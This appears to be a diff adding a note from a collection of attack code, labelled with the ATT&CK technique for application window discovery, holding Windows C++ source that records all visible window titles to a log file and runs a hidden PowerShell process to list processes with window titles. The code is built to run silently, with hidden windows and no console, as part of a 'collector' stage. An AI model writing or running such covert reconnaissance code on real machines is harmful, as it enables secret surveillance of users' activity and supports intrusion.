@@ -1,0 +1,92 @@
+---
+title: "Discovery.T1010.ApplicationWindowDiscovery"
+folder: "Całe Ataki/2. Collector"
+---
+
+
+
+
+
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <Windows.h>
+#include <locale>
+#include <codecvt>
+ 
+BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
+    std::ofstream outputFile("C:\\Users\\User\\Downloads\\logs\\window_titles.txt", std::ios::app);
+    if (!outputFile.is_open()) {
+        return FALSE;
+    }
+
+    const int titleLength = GetWindowTextLengthW(hWnd); 
+    if (titleLength > 0) {
+        std::vector<wchar_t> titleBuffer(titleLength + 1);
+        GetWindowTextW(hWnd, titleBuffer.data(), titleLength + 1); 
+        if (IsWindowVisible(hWnd)) {
+            std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+            std::string titleStr = converter.to_bytes(std::wstring(titleBuffer.begin(), titleBuffer.end()));
+
+            outputFile << "Window Title: " << titleStr << std::endl; 
+        }
+    }
+    outputFile.close();
+    return TRUE;
+}
+
+void AutorunRegistryBackground4() {
+    EnumWindows(EnumWindowsProc, NULL);
+}
+
+void RunSystemInfoInBackground() {
+    std::ofstream outputFile("C:\\Users\\User\\Downloads\\logs\\window_titlesPS.txt");
+    const char* command = "powershell.exe -Command  Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle -AutoSize";
+
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE hReadPipe, hWritePipe;
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }
+
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+
+    PROCESS_INFORMATION pi;
+
+    if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }
+
+    CloseHandle(hWritePipe);
+
+    const int BUFFER_SIZE = 4096;
+    char buffer[BUFFER_SIZE];
+    DWORD bytesRead;
+
+    while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+        std::string data(buffer, bytesRead);
+        size_t pos = 0;
+
+        while ((pos = data.find("\n", pos)) != std::string::npos) {
+            data.erase(pos, 1);  
+        }
+
+        outputFile.write(data.c_str(), data.size());
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    outputFile.close();
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    AutorunRegistryBackground4();
+    RunSystemInfoInBackground();
+    return 0;
+}
